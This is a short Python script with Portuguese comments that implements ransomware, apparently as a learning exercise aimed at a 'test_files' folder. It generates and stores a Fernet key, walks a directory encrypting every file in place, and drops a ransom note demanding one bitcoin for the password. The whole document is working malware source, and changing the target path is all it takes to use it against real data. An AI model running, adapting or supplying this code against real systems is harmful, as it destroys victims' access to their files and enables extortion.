from cryptography.fernet import Fernet
import os

#1. Gerar a chave de criptografia
def gerar_chave():
    chave = Fernet.generate_key()
    with open("chave.key", "wb") as chave_file:
        chave_file.write(chave)

#2. carregar a chave
def carrega_chave():
    return open("chave.key", "rb").read()

#3. criptografar um arquivo
def criptografar_arquivo(arquivo, chave):
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
    dados_encriptados = f.encrypt(dados)
    with open(arquivo, "wb") as file:
        file.write(dados_encriptados)

#4. Encontrar arquivos para criptografar
def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            if nome != "ransoware.py" and not nome.endswith(".key"):
                lista.append(caminho)
    return lista

#5. Mensagem de resgate
def mensagem_resgate():
    with open("Leia_Isso.txt", "w") as f:
        f.write("Seus dados foram criptografados!\n")
        f.write("Para recuperar, envie 1 bt para mim!\n")
        f.write("Depois disso, envio a senha!")

#6. Execuçao
def main():
    gerar_chave()
    chave = carrega_chave()
    arquivos = encontrar_arquivos("test_files")
    for arquivos in arquivos:
        criptografar_arquivo(arquivos, chave)
    mensagem_resgate()
    print("Ransoware executado com sucesso!!")

if __name__ == "__main__":
    main()

